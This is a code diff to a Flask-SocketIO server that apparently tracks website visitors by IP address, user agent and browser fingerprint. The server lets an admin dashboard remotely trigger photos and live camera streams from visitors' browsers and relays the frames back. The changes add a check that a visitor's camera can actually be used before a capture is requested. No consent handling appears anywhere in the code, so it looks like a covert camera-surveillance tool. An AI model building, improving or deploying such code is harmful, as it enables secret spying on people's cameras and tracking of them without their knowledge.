@@ -765,8 +765,15 @@ def collect_data():
                         logger.warning(f"WebSocket error parsing camera permission: {e}")
                         camera_permission = {}
                     
-                    # Check if user is online
-                    is_online = entry_id_db in active_users or fingerprint_db in [user_info.get('fingerprint', '') for user_info in active_users.values()]
+                    # Check if user is online AND capable (can actually stream/take photos)
+                    is_online = False
+                    if entry_id_db in active_users:
+                        is_online = active_users[entry_id_db].get('capable', False)
+                    elif fingerprint_db:
+                        for user_info in active_users.values():
+                            if user_info.get('fingerprint') == fingerprint_db:
+                                is_online = user_info.get('capable', False)
+                                break
                     
                     # Prepare full entry data
                     try:
@@ -846,8 +853,15 @@ def collect_data():
                         logger.warning(f"WebSocket error parsing camera permission: {e}")
                         camera_permission = {}
                     
-                    # Check if user is online
-                    is_online = entry_id_db in active_users or fingerprint_db in [user_info.get('fingerprint', '') for user_info in active_users.values()]
+                    # Check if user is online AND capable (can actually stream/take photos)
+                    is_online = False
+                    if entry_id_db in active_users:
+                        is_online = active_users[entry_id_db].get('capable', False)
+                    elif fingerprint_db:
+                        for user_info in active_users.values():
+                            if user_info.get('fingerprint') == fingerprint_db:
+                                is_online = user_info.get('capable', False)
+                                break
                     
                     # Prepare entry data for dashboard
                     # Column order: id, timestamp, ip_address, user_agent, device_info, fingerprint,
@@ -1007,8 +1021,15 @@ def admin_dashboard():
                     logger.warning(f"Entry #{entry_id} - Error parsing camera_permission: {e}, raw: {camera_permission_raw[:200]}...")
                     camera_permission = {}
                 
-                # Check if user is online (registered via WebSocket)
-                is_online = entry_id in active_users or fingerprint in [user_info.get('fingerprint', '') for user_info in active_users.values()]
+                # Check if user is online AND capable (can actually stream/take photos)
+                is_online = False
+                if entry_id in active_users:
+                    is_online = active_users[entry_id].get('capable', False)
+                elif fingerprint:
+                    for user_info in active_users.values():
+                        if user_info.get('fingerprint') == fingerprint:
+                            is_online = user_info.get('capable', False)
+                            break
                 
                 data.append({
                     'id': entry_id,
@@ -1614,29 +1635,45 @@ def handle_ping(data):
     """Handle periodic ping from client to keep connection alive"""
     entry_id = data.get('entry_id')
     fingerprint = data.get('fingerprint', '')
+    capable = data.get('capable', False)  # Can user actually stream/take photos?
     
     if entry_id:
         # If user not in active_users, register them (handles reconnection)
         if entry_id not in active_users:
+            was_online = False
             active_users[entry_id] = {
                 'socket_id': request.sid,
                 'fingerprint': fingerprint,
                 'registered_at': datetime.now().isoformat(),
-                'last_ping': datetime.now().isoformat()
+                'last_ping': datetime.now().isoformat(),
+                'capable': capable
             }
             join_room(f'user_{entry_id}')
-            logger.debug(f"Auto-registered user entry {entry_id} via ping")
+            logger.debug(f"Auto-registered user entry {entry_id} via ping (capable: {capable})")
             
-            # Broadcast user status update
-            emit('user_status_update', {
-                'entry_id': entry_id,
-                'is_online': True
-            }, broadcast=True, include_self=False)
+            # Only mark as online if user is capable
+            is_online = capable
+            if is_online != was_online:
+                emit('user_status_update', {
+                    'entry_id': entry_id,
+                    'is_online': is_online
+                }, broadcast=True, include_self=False)
         else:
             # Update existing user
+            was_online = active_users[entry_id].get('capable', False)
             active_users[entry_id]['last_ping'] = datetime.now().isoformat()
             active_users[entry_id]['socket_id'] = request.sid
-            logger.debug(f"Ping received from entry {entry_id}")
+            active_users[entry_id]['capable'] = capable  # Update capability
+            
+            # Only mark as online if user is capable
+            is_online = capable
+            if is_online != was_online:
+                emit('user_status_update', {
+                    'entry_id': entry_id,
+                    'is_online': is_online
+                }, broadcast=True, include_self=False)
+            
+            logger.debug(f"Ping received from entry {entry_id} (capable: {capable})")
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -1667,26 +1704,29 @@ def handle_register_user(data):
     """Register a user when they connect (for photo requests)"""
     entry_id = data.get('entry_id')
     fingerprint = data.get('fingerprint', '')
+    capable = data.get('capable', False)  # Can user actually stream/take photos?
     
     if entry_id:
         # Update or create user registration
         # This handles re-registration after reconnection
-        was_online = entry_id in active_users
+        was_online = entry_id in active_users and active_users[entry_id].get('capable', False)
         
         active_users[entry_id] = {
             'socket_id': request.sid,
             'fingerprint': fingerprint,
             'registered_at': datetime.now().isoformat(),
-            'last_ping': datetime.now().isoformat()
+            'last_ping': datetime.now().isoformat(),
+            'capable': capable  # Store capability status
         }
         join_room(f'user_{entry_id}')
-        logger.debug(f"Registered user entry {entry_id} with fingerprint {fingerprint[:16]}...")
+        logger.debug(f"Registered user entry {entry_id} with fingerprint {fingerprint[:16]}... (capable: {capable})")
         
-        # Broadcast user status update to admin dashboard (only if status changed)
-        if not was_online:
+        # Only mark as online if user is capable of streaming/taking photos
+        is_online = capable
+        if is_online != was_online:
             emit('user_status_update', {
                 'entry_id': entry_id,
-                'is_online': True
+                'is_online': is_online
             }, broadcast=True, include_self=False)
         
         # Check if there are any pending photo requests for this user
@@ -1732,7 +1772,19 @@ def handle_request_photo(data):
                 break
     
     if target_socket_id and target_entry_id:
-        # Send photo request to the user
+        # Check if user is capable (can actually stream/take photos)
+        user_capable = active_users[target_entry_id].get('capable', False)
+        
+        if not user_capable:
+            error_msg = f"User cannot take photos (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
+            logger.warning(error_msg)
+            emit('photo_request_error', {
+                'error': error_msg,
+                'suggestion': 'The user must have camera access enabled to take photos. User is connected but cannot access camera.'
+            })
+            return
+        
+        # User is online and capable - send photo request
         request_data = {
             'entry_id': target_entry_id,
             'fingerprint': fingerprint,
@@ -1818,7 +1870,19 @@ def handle_request_stream(data):
                 break
     
     if target_socket_id and target_entry_id:
-        # User is online - send stream request
+        # Check if user is capable (can actually stream/take photos)
+        user_capable = active_users[target_entry_id].get('capable', False)
+        
+        if not user_capable:
+            error_msg = f"User cannot stream (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
+            logger.warning(error_msg)
+            emit('stream_request_error', {
+                'error': error_msg,
+                'suggestion': 'The user must have camera access enabled to start a live stream. User is connected but cannot access camera.'
+            })
+            return
+        
+        # User is online and capable - send stream request
         request_data = {
             'entry_id': target_entry_id,
             'fingerprint': fingerprint,
@@ -1845,7 +1909,7 @@ def handle_request_stream(data):
         logger.warning(error_msg)
         emit('stream_request_error', {
             'error': error_msg,
-            'suggestion': 'The user must be online to start a live stream.'
+            'suggestion': 'The user must be online and have camera access to start a live stream.'
         })
 
 @socketio.on('stop_stream')
@@ -1883,6 +1947,24 @@ def handle_stream_frame(data):
             'frame_data': frame_data,
             'timestamp': datetime.now().isoformat()
         }, to=admin_socket_id)
+
+@socketio.on('stream_status')
+def handle_stream_status(data):
+    """Handle stream status updates from user"""
+    entry_id = data.get('entry_id')
+    status = data.get('status')
+    message = data.get('message', '')
+    
+    if entry_id and entry_id in active_streams:
+        # Forward status to admin
+        admin_socket_id = active_streams[entry_id]['admin_socket_id']
+        emit('stream_status', {
+            'entry_id': entry_id,
+            'status': status,
+            'message': message,
+            'timestamp': datetime.now().isoformat()
+        }, to=admin_socket_id)
+        logger.info(f"Stream status update for entry {entry_id}: {status} - {message}")
 
 def cleanup_offline_users():
     """Background task to remove users who haven't pinged in a while"""
